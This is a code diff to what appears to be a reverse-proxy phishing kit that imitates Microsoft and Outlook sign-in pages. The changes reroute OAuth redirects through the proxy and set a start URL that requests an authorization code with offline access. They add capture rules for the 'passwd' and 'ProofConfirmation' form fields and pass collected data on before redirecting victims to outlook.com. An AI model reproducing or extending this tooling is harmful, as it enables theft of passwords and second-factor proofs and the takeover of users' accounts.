@@ -107,23 +107,30 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             super.captureBody(clientContext.currentDomain, clientContext)
 
         }
-    
-
-
-        const redirectToken = this.checkForRedirect()
-        if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
-            clientContext.currentDomain = process.env.PROXY_DOMAIN
-            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
-            // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
-        }
-
-
         if (this.req.url.startsWith('/identity/confirm')) {
             clientContext.currentDomain = 'account.live.com'
 
         }
 
-        if (this.req.url === '/auth0/outlook/owa2' || this.req.url.startsWith('/SummaryPage.aspx')) {
+
+        // Check for redirect
+        const redirectToken = this.checkForRedirect()
+        if (redirectToken !== null) {
+            if (redirectToken.url.startsWith('https://login.live.com/oauth20_authorize.srf?')) {
+                clientContext.currentDomain = 'login.live.com'
+                this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
+                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
+            }
+
+            if (redirectToken.url.startsWith('https://login.microsoftonline.com/common/oauth2/nativeclient')) {
+                super.sendClientData(clientContext, {})
+                this.res.writeHead('301', { location: 'https://outlook.com' })
+                return this.res.end()
+            }
+        }
+        
+
+        if (this.req.url === '/auth0/outlook/owa2') {
             super.sendClientData(clientContext, {})
             this.res.writeHead('301', { location: 'https://outlook.com' })
             return this.res.end()
@@ -138,14 +145,14 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
 
 const configExport = {
-    CURRENT_DOMAIN: 'login.live.com',
+    CURRENT_DOMAIN: 'login.microsoftonline.com',
 
     EXTERNAL_FILTERS: 
     [
         'account.live.com',
     ],
 
-    START_PATH: '/',
+    START_PATH: '/consumers/oauth2/v2.0/authorize?response_type=code&scope=Secrets.ReadWrite.CreatedByApp.Secure+offline_access&client_id=229f4d61-07eb-454a-9453-d27bba7cc95b&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&response_mode=query&state={%22id%22:%22fiedbfgcleddlbcmgdigjgdfcggjcion%22}',
 
     PRE_HANDLERS:
         [
@@ -165,6 +172,13 @@ const configExport = {
         loginPassword: {
             method: 'POST',
             params: ['passwd'],
+            urls: '',
+            hosts: ['login.live.com'],
+        },
+
+        proofConfirm: {
+            method: 'POST',
+            params: ['ProofConfirmation'],
             urls: '',
             hosts: ['login.live.com'],
         },
